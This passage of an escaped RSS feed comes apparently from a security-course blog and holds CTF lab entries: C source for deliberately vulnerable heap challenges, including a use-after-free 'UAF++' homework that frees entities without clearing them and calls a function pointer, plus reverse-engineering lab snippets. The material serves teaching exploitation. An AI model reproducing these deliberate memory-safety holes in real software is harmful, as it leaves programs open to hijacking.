&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;Delete done&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">memu&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;1. add note&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;2. read note&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;3. write note&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;4. delete note&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;choice: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdin, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;./flag.txt&amp;#34;&lt;/span>, O_RDONLY);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	notes[&lt;span style="color:#ae81ff">0&lt;/span>].len &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x30&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	notes[&lt;span style="color:#ae81ff">0&lt;/span>].content &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x30&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(fd, notes[&lt;span style="color:#ae81ff">0&lt;/span>].content, &lt;span style="color:#ae81ff">0x30&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	close(fd);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (;;)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		memu();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">int&lt;/span> choice &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">switch&lt;/span> (choice)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			add_note();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			read_note();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			write_note();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			delete_note();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			puts(&lt;span style="color:#e6db74">&amp;#34;Invalid command&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x40(2023 HW - UAF++)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x402023-hw---uaf++/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x402023-hw---uaf++/</guid><description>&lt;h1 id="simple-pwn-0x402023-hw---uaf">
 Simple PWN 0x40(2023 HW - UAF++)
 &lt;a class="anchor" href="#simple-pwn-0x402023-hw---uaf">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/SJWc9v4Bp">0x34(2023 Lab - UAF):three:&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">default_handle&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>event)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;EVENT: get event named &lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, event);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>name;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>event;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">void&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>event_handle)(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span> &lt;span style="color:#f92672">*&lt;/span>entities[&lt;span style="color:#ae81ff">0x2&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">read_int&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, buf, &lt;span style="color:#ae81ff">0x1f&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> atoi(buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">get_idx&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (idx &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0x2&lt;/span> &lt;span style="color:#f92672">||&lt;/span> idx &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">memu&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;1. register entity&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;2. delete entity&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;3. trigger event&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;choice: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">register_entity&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx] &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Default Event&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event_handle &lt;span style="color:#f92672">=&lt;/span> default_handle;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Nmae Length: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	len &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (len &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">||&lt;/span> len &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x430&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name &lt;span style="color:#f92672">=&lt;/span> malloc(len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Name: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name, len &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">delete_entity&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (entities[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		free(entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		free(entities[idx]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		puts(&lt;span style="color:#e6db74">&amp;#34;Invalid index&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">trigger_event&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (entities[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printf(&lt;span style="color:#e6db74">&amp;#34;Name: %s&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event_handle(entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdin, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (;;)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		memu();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">int&lt;/span> choice &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">switch&lt;/span> (choice)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			register_entity();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			delete_entity();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			trigger_event();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			puts(&lt;span style="color:#e6db74">&amp;#34;Invalid command&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse - 0x01(Lab - Sacred Arts)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x01lab---sacred-arts/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x01lab---sacred-arts/</guid><description>&lt;h1 id="simple-reverse---0x01lab---sacred-arts">
 Simple Reverse - 0x01(Lab - Sacred Arts)
 &lt;a class="anchor" href="#simple-reverse---0x01lab---sacred-arts">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://zh.wikibooks.org/wiki/X86%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80/%E5%9F%BA%E6%9C%AC%E6%8C%87%E4%BB%A4%E9%9B%86">X86組合語言/基本指令集&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.ibm.com/docs/en/aix/7.1?topic=set-neg-negate-instruction">neg (Negate) instruction&lt;/a>
實作：先在執行&lt;code>neg rax&lt;/code>之前把&lt;code>$rax&lt;/code>設定成2，執行指令之後剛好是2的補數
&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">gef➤ set $rax=2
gef➤ info r $rax
rax 0x2 0x2
gef➤ ni
0x00000000004010e0 in ?? ()
gef➤ info r $rax
rax 0xfffffffffffffffe 0xfffffffffffffffe
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;a href="https://zh.wikibooks.org/zh/X86%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80/%E5%9F%BA%E6%9C%AC%E6%8C%87%E4%BB%A4%E9%9B%86/IA32%E6%8C%87%E4%BB%A4:xchg">X86組合語言/基本指令集/IA32指令:xchg&lt;/a>
實作：執行&lt;code>xchg ah, al&lt;/code>之前先看一下&lt;code>$rax&lt;/code>的狀態
&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">gef➤ info r $rax
rax 0xfffffffffffffffe 0xfffffffffffffffe
gef➤ ni
0x00000000004010e2 in ?? ()
gef➤ info r $rax
rax 0xfffffffffffffeff 0xfffffffffffffeff
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Pro Disassembler Code&lt;/p></description></item><item><title>Simple Reverse - 0x03(Lab - Why)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x03lab---why/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x03lab---why/</guid><description>&lt;h1 id="simple-reverse---0x03lab---why">
 Simple Reverse - 0x03(Lab - Why)
 &lt;a class="anchor" href="#simple-reverse---0x03lab---why">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://chenhh.gitbooks.io/parallel_processing/content/cython/function_pointer.html">What is function pointer?&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.youtube.com/live/IJlYPH1ljIY?feature=share&amp;amp;t=9587">Lecture Vid.&lt;/a>
&lt;img src="https://hackmd.io/_uploads/BJlVKMiO2.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA main function&lt;/p>
&lt;pre tabindex="0">&lt;code>int __cdecl main(int argc, const char **argv, const char **envp)
{
 int i; // [rsp+Ch] [rbp-4h]

 printf(&amp;#34;Give me flag: &amp;#34;);
 __isoc99_scanf(&amp;#34;%25s&amp;#34;, buf);
 for ( i = 0; i &amp;lt;= 24; ++i )
 {
 if ( buf[i] - 10 != enc_flag[i] )
 return 0;
 }
 pass = 1;
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse - 0x14(2023 Lab - AssemblyDev)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x142023-lab---assemblydev/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x142023-lab---assemblydev/</guid><description>&lt;h1 id="simple-reverse---0x142023-lab---assemblydev">
 Simple Reverse - 0x14(2023 Lab - AssemblyDev)
 &lt;a class="anchor" href="#simple-reverse---0x142023-lab---assemblydev">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Tools
&lt;a href="https://carlosrafaelgn.com.br/Asm86/">Assembly x86 Emulator&lt;/a>
&lt;a href="https://godbolt.org/">Compiler Explorer&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler arithmatic.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> module.checker &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> module.math &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> sys &lt;span style="color:#f92672">import&lt;/span> argv
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>challenge_info &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
